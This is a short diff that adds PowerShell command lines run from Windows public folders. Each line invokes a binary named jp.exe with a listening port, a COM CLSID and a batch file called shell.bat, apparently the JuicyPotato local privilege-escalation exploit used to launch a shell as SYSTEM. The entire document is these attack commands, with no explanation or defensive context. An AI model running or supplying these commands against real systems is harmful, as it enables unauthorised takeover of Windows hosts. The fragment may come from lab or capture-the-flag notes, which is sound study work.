@@ -1,0 +1,7 @@
+PS C:\Users\Public\Downloads> ./jp.exe -t * -p shell.bat -l 4444
+
+./jp.exe -t * -p shell.bat -l 4444  -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
+
+
+PS C:\users\public\documents> ./jp.exe -t * -p shell.bat -l 4444  -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
+
